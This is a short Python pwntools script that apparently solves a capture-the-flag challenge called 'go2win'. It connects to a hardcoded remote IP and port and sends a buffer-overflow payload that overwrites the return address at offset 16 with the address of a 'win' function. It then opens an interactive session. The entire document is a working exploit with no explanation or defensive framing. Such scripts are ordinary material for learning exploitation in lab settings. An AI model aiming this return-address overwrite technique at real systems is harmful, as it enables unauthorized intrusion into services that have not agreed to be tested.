from pwn import *

exe = context.binary = ELF('go2win')

io = remote('92.246.89.201', 10003)#exe.process()

winaddr = 0x47f7a0

payload = fit({
    16: p64(winaddr)
})
io.sendline(payload)
io.interactive()
